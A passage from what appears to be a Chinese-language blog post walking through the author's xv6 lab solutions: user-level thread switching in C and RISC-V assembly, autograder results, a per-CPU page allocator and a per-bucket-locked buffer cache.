class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="keyword">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  t-&gt;context.sp=(uint64)t-&gt;<span class="built_in">stack</span>+STACK_SIZE<span class="number">-1</span>;</span><br><span class="line">  t-&gt;context.ra=(uint64)func;</span><br><span class="line">  <span class="comment">// YOUR CODE HEREs</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    thread_switch((uint64)&amp;(t-&gt;context),(uint64)&amp;(current_thread-&gt;context));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="keyword">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line">	sd ra, 0(a0)</span><br><span class="line">	sd sp, 8(a0)</span><br><span class="line">	sd s0, 16(a0)</span><br><span class="line">	sd s1, 24(a0)</span><br><span class="line">	sd s2, 32(a0)</span><br><span class="line">	sd s3, 40(a0)</span><br><span class="line">	sd s4, 48(a0)</span><br><span class="line">	sd s5, 56(a0)</span><br><span class="line">	sd s6, 64(a0)</span><br><span class="line">	sd s7, 72(a0)</span><br><span class="line">	sd s8, 80(a0)</span><br><span class="line">	sd s9, 88(a0)</span><br><span class="line">	sd s10, 96(a0)</span><br><span class="line">	sd s11, 104(a0)</span><br><span class="line"></span><br><span class="line">	ld ra, 0(a1)</span><br><span class="line">	ld sp, 8(a1)</span><br><span class="line">	ld s0, 16(a1)</span><br><span class="line">	ld s1, 24(a1)</span><br><span class="line">	ld s2, 32(a1)</span><br><span class="line">	ld s3, 40(a1)</span><br><span class="line">	ld s4, 48(a1)</span><br><span class="line">	ld s5, 56(a1)</span><br><span class="line">	ld s6, 64(a1)</span><br><span class="line">	ld s7, 72(a1)</span><br><span class="line">	ld s8, 80(a1)</span><br><span class="line">	ld s9, 88(a1)</span><br><span class="line">	ld s10, 96(a1)</span><br><span class="line">	ld s11, 104(a1)</span><br><span class="line">	ret    /* return to ra */</span><br></pre></td></tr></table></figure>

<p>后面两个实验就是用户态的锁和释放，就不放代码了</p>
<h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make: “kernel/kernel”已是最新。</span><br><span class="line">== Test uthread == uthread: OK (0.9s) </span><br><span class="line">== Test answers-thread.txt == answers-thread.txt: OK </span><br><span class="line">== Test ph_safe == make: “ph”已是最新。</span><br><span class="line">ph_safe: OK (10.8s) </span><br><span class="line">== Test ph_fast == make: “ph”已是最新。</span><br><span class="line">ph_fast: OK (22.3s) </span><br><span class="line">== Test barrier == make: “barrier”已是最新。</span><br><span class="line">barrier: OK (11.1s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 60/60</span><br></pre></td></tr></table></figure>

<h2 id="Lab8-locks"><a href="#Lab8-locks" class="headerlink" title="Lab8: locks"></a>Lab8: locks</h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><p>为每个cpu准备一个空闲队列，然后每个cpu在自己的空闲队列上获得新页面，然后为每个空闲队列准备一个锁</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;memlayout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> end[]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem[<span class="number">0</span>].lock, <span class="string">&quot;kmem0&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">1</span>].lock, <span class="string">&quot;kmem1&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">2</span>].lock, <span class="string">&quot;kmem2&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa : %p\n&quot;</span>,(uint64)pa);</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line">  keme_id=(((uint64)pa)&gt;&gt;<span class="number">12</span>)%<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r-&gt;next = kmem[keme_id].freelist;</span><br><span class="line">  kmem[keme_id].freelist = r;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_other_freeelist_r</span><span class="params">(uint32 kmem_id)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  acquire(&amp;kmem[kmem_id].lock);</span><br><span class="line">  r = kmem[kmem_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[kmem_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[kmem_id].lock);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line">  keme_id=cpuid();</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r = kmem[keme_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[keme_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">    r=get_other_freeelist_r((keme_id+<span class="number">1</span>)%<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">      r=get_other_freeelist_r((keme_id+<span class="number">2</span>)%<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><p>在xv6操作系统中，会有一个缓冲区列表来记录磁盘内容，当读磁盘的时候，首先会把内容缓冲到这个缓冲区，然后再从这个缓冲区中读取信息，刚开始这个缓冲区全部放在一个链表中然后使用一个锁防止竞争，但是io吞吐量比较大的时候是比较浪费cpu资源的，所以得让数据结构更加细化，选择使用一个桶（但感觉和哈希表没啥差别）来整多个链表，然后每个链表一个锁来保护，这样既能防止竞争，又能更加线程化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Bucket_size 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH(id) (id%13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;sleeplock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;buf.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">bucket</span>&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> <span class="title">buckets</span>[13];</span></span><br><span class="line">  </span><br><span class="line">&#125; bcache;</span><br><span class="line"><span class="keyword">char</span> lockname[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> b_lockname[<span class="number">30</span>][<span class="number">16</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(lockname));</span><br><span class="line">  <span class="built_in">memset</span>(b_lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(b_lockname));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(lockname[i],<span class="keyword">sizeof</span>(lockname),<span class="string">&quot;bcahce_%d&quot;</span>,i);</span><br><span class="line">    initlock(&amp;(bcache.buckets[i].lock),lockname[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    bcache.buckets[i].head.prev=&amp;bcache.buckets[i].head;</span><br><span class="line">    bcache.buckets[i].head.next=&amp;bcache.buckets[i].head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;</span><br><span class="line">    b-&gt;next = bcache.buckets[<span class="number">0</span>].head.next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.buckets[<span class="number">0</span>].head;</span><br><span class="line">    <span class="built_in">snprintf</span>(b_lockname[i],<span class="keyword">sizeof</span>(b_lockname),<span class="string">&quot;buffer_%d&quot;</span>,i);</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock,b_lockname[i]);</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next-&gt;prev = b;</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next = b;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bget</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  uint32 bid;</span><br><span class="line">  bid=HASH(blockno);</span><br><span class="line">  tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// // Is the block already cached?</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.next; b != &amp;bcache.head; b = b-&gt;next)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt++;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">for</span>(b=bcache.buckets[bid].head.next;b!=&amp;bcache.buckets[bid].head;b=b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(dev==b-&gt;dev&amp;&amp;blockno==b-&gt;blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      b-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=bid,cur=<span class="number">0</span>;cur&lt;Bucket_size;i=(i+<span class="number">1</span>)%Bucket_size)&#123;</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">if</span>(i!=bid)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!holding(&amp;bcache.buckets[i].lock))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;asd\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">        acquire(&amp;bcache.buckets[i].lock);</span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq_end:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(b=bcache.buckets[i].head.next;b!=&amp;bcache.buckets[i].head;b=b-&gt;next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt==<span class="number">0</span>&amp;&amp;((b-&gt;timetick&lt;tmp-&gt;timetick)||tmp))&#123;</span><br><span class="line">        tmp=b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tmp)&#123;</span><br><span class="line">      <span class="comment">// printf(&quot;tmp:%d,bif:%d\n&quot;,i,bid);</span></span><br><span class="line">      tmp-&gt;next-&gt;prev=tmp-&gt;prev;</span><br><span class="line">      tmp-&gt;prev-&gt;next=tmp-&gt;next;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      tmp-&gt;next=bcache.buckets[bid].head.next;</span><br><span class="line">      tmp-&gt;prev=&amp;bcache.buckets[bid].head;</span><br><span class="line">      bcache.buckets[bid].head.next-&gt;prev=tmp;</span><br><span class="line">      bcache.buckets[bid].head.next=tmp;</span><br><span class="line">      tmp-&gt;dev = dev;</span><br><span class="line">      tmp-&gt;blockno = blockno;</span><br><span class="line">      tmp-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      tmp-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      tmp-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep:%s\n&quot;,tmp-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;tmp-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span 